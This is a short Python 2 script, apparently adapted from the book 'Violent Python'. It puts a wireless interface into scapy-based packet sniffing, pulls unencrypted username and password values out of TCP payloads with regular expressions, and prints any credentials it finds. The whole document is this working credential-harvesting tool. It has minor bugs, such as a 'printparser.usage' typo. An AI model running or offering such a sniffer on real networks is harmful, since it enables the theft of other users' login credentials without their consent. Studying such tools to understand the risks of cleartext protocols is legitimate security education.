#!/usr/bin/env python2
# written by Moses Arocha
# Written with the help of TJ O'Connor in his book "Violent Python"
# This code attempts to sniff a wireless connection and grab any username and password entered that is unencrypted.

import optparse
from scapy.all import *

def findCredentials(pkt):	
    raw = pkt.sprintf('%Raw.load%')						
    Username = re.findall('(?i)username=(.*)&', raw)			# grabs the username from the raw stack of data transmitted
    Password = re.findall("(?i)password=(.*)'", raw)			# grabs the password from the raw stack of data transmitted
    if Username:
        print '\n\t[Success] Found Login User ' + str(Username[0]) + ', Password: ' + str(Password[0])	
        # The only output the user ever sees.

def main():
    if not os.geteuid() == 0:
        sys.exit('Must Be Root!')					 # The User must have UID 0 enabled.
    parser = optparse.OptionParser('Uses Of Program: -i <Interface>') 
    parser.add_option('-i', dest='interface', type='string', help='Specify Interface To Listen On', default='wlan0') 
    (options, args) = parser.parse_args()
    if options.interface == None:
        printparser.usage
	exit(0)
    else:
	conf.iface = options.interface
    try:
        print '\n\n\t[Starting] Starting Clear Text Website Sniffer'
	sniff(filter='tcp', prn=findCredentials, store=0)
    except KeyboardInterrupt:						# The program is stopped if the user types any keys.
	exit(0)
	
if __name__ == '__main__':
     main()
